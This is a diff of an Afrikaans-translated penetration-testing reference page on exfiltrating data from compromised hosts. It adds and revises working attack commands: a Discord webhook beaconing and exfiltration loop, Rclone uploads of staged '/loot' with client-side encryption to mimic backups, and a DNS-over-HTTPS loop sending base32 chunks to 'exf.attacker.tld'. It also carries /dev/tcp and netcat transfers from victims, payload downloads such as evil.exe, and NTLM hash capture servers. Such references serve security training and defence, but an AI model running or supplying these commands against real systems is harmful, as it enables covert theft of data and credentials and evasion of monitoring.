@@ -3,15 +3,15 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Vir ’n end-tot-end voorbeeld van die staging van loot in `C:\Users\Public` en die exfiltrering daarvan met Rclone om wettige backups na te boots, hersien die workflow hieronder.
+> Vir 'n end-tot-end voorbeeld van die stashing van loot in `C:\Users\Public` en dit met Rclone te exfiltrate om wettige backups na te boots, hersien die workflow hieronder.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Gewoonlik witlys-domeine om inligting te exfiltrate
+## Commonly whitelisted domains to exfiltrate information
 
-Kyk na [https://lots-project.com/](https://lots-project.com/) om gewoonlik witlys-domeine te vind wat misbruik kan word
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
 ## Copy\&Paste Base64
 
@@ -109,9 +109,9 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) is 'n enkele-binêre plaasvervanger vir `python3 -m http.server`
-met oplaai, aflaai, WebDAV, SFTP, SMB, TLS, verifikasie, deel skakels,
-en OOB samewerkingsfunksies (DNS, SMTP, NTLM hash capture).
+[goshs](https://github.com/patrickhener/goshs) is ’n enkele-binary vervanging vir `python3 -m http.server`
+met upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+en OOB collaboration features (DNS, SMTP, NTLM hash capture).
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -142,12 +142,12 @@ goshs -tunnel
 ```
 ## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks is skryf-net HTTPS-endpunte wat JSON en opsionele lêer-onderdele aanvaar. Hulle word algemeen toegelaat na vertroude SaaS-domeine en benodig geen OAuth/API-sleutels nie, wat hulle nuttig maak vir lae-wrywing beaconing en exfiltration.
+Webhooks is write-only HTTPS endpoints wat JSON en opsionele lêergedeeltes aanvaar. Hulle word algemeen toegelaat na trusted SaaS domains en benodig geen OAuth/API keys nie, wat hulle nuttig maak vir lae-wrywing beaconing en exfiltration.
 
 Key ideas:
 - Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator loop pattern: periodieke beacon -> directory recon -> geteikende lêer exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirm delivery.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -218,16 +218,43 @@ Start-Sleep -Seconds 20
 }
 ```
 Notas:
-- Soortgelyke patrone geld vir ander samewerkingsplatforms (Slack/Teams) met hul inkomende webhooks; pas die URL en JSON-schema dienooreenkomstig aan.
-- Vir DFIR van Discord Desktop cache-artifacts en webhook/API-herstel, sien:
+- Soortgelyke patrone geld vir ander samewerkingsplatforms (Slack/Teams) met hul inkomende webhooks; pas URL en JSON-skema dienooreenkomstig aan.
+- Vir DFIR van Discord Desktop-kasartefakte en webhook/API-herwinning, sien:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
+## Rclone (cloud/object-storage exfiltration)
+
+Moderne operateurs **stoor loot dikwels plaaslik** en gebruik dan [Rclone](https://rclone.org/) om die oordrag soos ’n normale backup- of sync-taak te laat lyk. ’n Praktiese patroon is:
+
+1. ’n Normale remote (`s3`, `webdav`, `drive`, `mega`, ...)
+2. ’n `crypt` wrapper sodat **contents en filenames client-side geïnkripteer is**
+3. ’n Opsionele `chunker` wrapper as die provider object-grootte-limiete afdwing of as jy kleiner upload-eenhede wil hê
+```bash
+# 1) Create the storage backend remote (interactive)
+rclone config              # ex: remote
+
+# 2) Wrap it with client-side encryption
+rclone config              # ex: secret -> remote:path
+
+# 3) Optional: create a chunker overlay for large objects
+rclone config              # ex: overlay -> secret:
+
+# 4) Upload staged data
+rclone copy /loot secret:$(hostname)-$(date +%F) \
+--transfers 2 --checkers 2 --bwlimit 4M
+# If you created the chunker wrapper, upload to overlay:... instead
+```
+Notas:
+- `crypt` kan beide lêerinhoude en name enkripteer.
+- `chunker` verdeel groot lêers deursigtig en stel hulle weer saam tydens aflaai.
+- `rclone.conf` stoor `crypt` geheime in 'n **verduisterde** vorm, nie sterk beskerming in rus nie. Vir kortstondige operasies, verkies 'n toegewyde tydelike config en verwyder dit daarna.
+
 ## FTP
 
-### FTP-server (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -268,14 +295,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali as server
+Kali as bediener
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb-deel **met samba**:
+Of skep 'n smb share **met samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -300,7 +327,7 @@ WindPS-2> cd new_disk:
 ```
 ### goshs
 [goshs](https://github.com/patrickhener/goshs) is 'n enkel-binêre alternatief
-wat lêers oor SMB bedien en NetNTLMv2-hashes van verbindende kliënte vasvang:
+wat lêers oor SMB bedien en NetNTLMv2-hashes van gekoppelde kliënte vasvang:
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -316,7 +343,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die slagoffer SSH het, kan die aanvaller ’n gids van die slagoffer na die aanvaller mount.
+As die slagoffer SSH het, kan die aanvaller ’n gids vanaf die slagoffer na die aanvaller mount.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -329,19 +356,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Laai lêer af van slagoffer
+### Laai lêer van slagoffer af
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Laai lêer op na slagoffer
+### Laai lêer op na die slagoffer
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-dank aan **@BinaryShadow\_**
+dankie aan **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -361,21 +388,38 @@ print(f"{data.decode('utf-8')}", flush=True, end="")
 
 sniff(iface="tun0", prn=process_packet)
 ```
+## DNS over HTTPS (DoH)
+
+As klassieke UDP/53 DNS raserig is of geblokkeer is, maar uitgaande HTTPS breed toegelaat word, kan die gewone DNS-label exfiltration-patroon binne **DoH** requests na ’n publieke resolver toegedraai word. Hou elke label ver onder die 63-byte DNS-limiet en gebruik ’n DNS-veilige alfabet soos Base32.
+```bash
+# Encode -> split into DNS-safe labels -> send via DoH
+base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
+nl -nrz -w4 -s. | while read chunk; do
+curl --http2 -s \
+-H 'accept: application/dns-json' \
+"https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
+>/dev/null
+done
+```
+Op die gesaghebbende DNS-bediener vir `exf.attacker.tld`, sorteer die queries volgens die numeriese voorvoegsel en rekonstrueer die Base32-stroom. Dit hou die transport binne HTTPS na die resolver in plaas van klassieke UDP/53 DNS.
+
+Vir volledige tweerigting DNS-tunnel tooling (`iodine`, `dnscat2`, ens.), kyk [die tunneling page](tunneling-and-port-forwarding.md).
+
 ## **SMTP**
 
-As jy data na ’n SMTP-bediener kan stuur, kan jy ’n SMTP skep om die data met python te ontvang:
+As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) kan 'n vinnige SMTP-bediener opstel
-om e-pos-terugroepe tydens OOB exfiltration-scenario's vas te vang:
+[goshs](https://github.com/patrickhener/goshs) kan ’n vinnige SMTP-bediener opstel
+om e-pos-terugroepe tydens OOB-exfiltration-scenario's vas te vang:
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
-Ontvange e-posse en terugbeloproepe word direk in die terminal-uitset vertoon.
+Ontvangen e-posse en terugroepe word direk in die terminaal-uitvoer vertoon.
 Kan gekombineer word met die DNS-terugbelbediener vir volle OOB-dekking:
 ```bash
 # DNS + SMTP combined
@@ -383,7 +427,7 @@ goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-By default in XP and 2003 (in others it needs to be explicitly added during installation)
+By verstek in XP en 2003 (in ander moet dit uitdruklik tydens installasie bygevoeg word)
 
 In Kali, **start TFTP server**:
 ```bash
@@ -392,12 +436,12 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP-server in python:**
+**TFTP server in python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **victim**, koppel aan die Kali-bediener:
+In **victim**, koppel aan die Kali-server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -445,23 +489,20 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat deur ’n hex van ’n binary te verskaf, `debug.exe` die binary-lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe ’n **beperking het om lêers tot 64 kb in grootte te assembleer**.
+Die `debug.exe` program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om hulle uit hex te herbou**. Dit beteken dat, deur ’n hex van ’n binary te verskaf, `debug.exe` die binary-lêer kan genereer. Dit is egter belangrik om daarop te let dat debug.exe ’n **beperking het om lêers van tot 64 kb in grootte saam te stel**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Kopieer en plak dan die teks in die windows-shell en ’n lêer genaamd nc.exe sal geskep word.
+Dan kopieer-plak die teks in die windows-shell en ’n lêer genaamd nc.exe sal geskep word.
 
-- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+## References
 
-## DNS
-
-- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
-- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
-
-## Verwysings
-
+- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [Rclone `crypt` backend](https://rclone.org/crypt/)
+- [goshs](https://github.com/patrickhener/goshs)
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
